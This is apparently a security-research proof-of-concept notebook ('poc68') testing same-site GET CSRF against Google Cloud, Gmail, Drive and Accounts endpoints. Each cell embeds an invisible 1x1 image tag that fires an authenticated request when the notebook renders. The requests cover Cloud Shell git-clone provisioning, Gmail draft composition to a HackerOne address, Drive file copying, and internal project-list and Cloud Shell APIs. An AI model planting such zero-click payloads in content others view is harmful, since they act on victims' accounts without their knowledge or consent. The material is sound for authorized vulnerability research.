# %% [markdown]
# # poc68 -- GCP side-effect endpoints via same-site GET CSRF
#
# Tests: Cloud Shell git clone provisioning, Gmail draft creation, Drive file copy, Cloud Shell REST API, GCP project list, accounts reach.

# %% [markdown]
# <img src="https://console.cloud.google.com/cloudshell/open?git_repo=https://colab.research.google.com/__poc68/CS_GIT_CLONE&page=editor&open_in_editor=README.md" width="1" height="1">
#
# Cloud Shell git clone: does GET to cloudshell/open trigger server-side git clone attempt?

# %% [markdown]
# <img src="https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://colab.research.google.com/__poc68/SHELL_GIT_CLONE&cloudshell_open_in_editor=README.md" width="1" height="1">
#
# Cloud Shell via shell.cloud.google.com: same git clone test on shell subdomain.

# %% [markdown]
# <img src="https://ssh.cloud.google.com/cloudshell/editor?hl=en&git_repo=https://colab.research.google.com/__poc68/SSH_GIT_CLONE&open_in_editor=README.md" width="1" height="1">
#
# SSH Cloud Shell: does ssh.cloud.google.com/cloudshell/editor trigger git clone?

# %% [markdown]
# <img src="https://mail.google.com/mail/u/0/?view=cm&to=validbyaccident%40wearehackerone.com&su=poc68+CSRF+test&body=zero-click+draft+creation+test" width="1" height="1">
#
# Gmail compose GET: does loading compose URL create a draft or queue a send?

# %% [markdown]
# <img src="https://drive.google.com/file/d/1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs/copy" width="1" height="1">
#
# Drive file copy via GET: does /file/d/ID/copy create a copy in victim Drive?

# %% [markdown]
# <img src="https://shell.cloud.google.com/_ah/api/cloudshell/v1/users/me/environments/default" width="1" height="1">
#
# Cloud Shell REST API: GET environment status -- confirms same-site REST API access.

# %% [markdown]
# <img src="https://console.cloud.google.com/_ah/api/cloudresourcemanager/v1/projects?pageSize=5" width="1" height="1">
#
# GCP Console internal project list API: GET with auth cookies, check status.

# %% [markdown]
# <img src="https://accounts.google.com/SignOutOptions" width="1" height="1">
#
# Accounts SignOutOptions GET: confirms auth reach to account management endpoints.
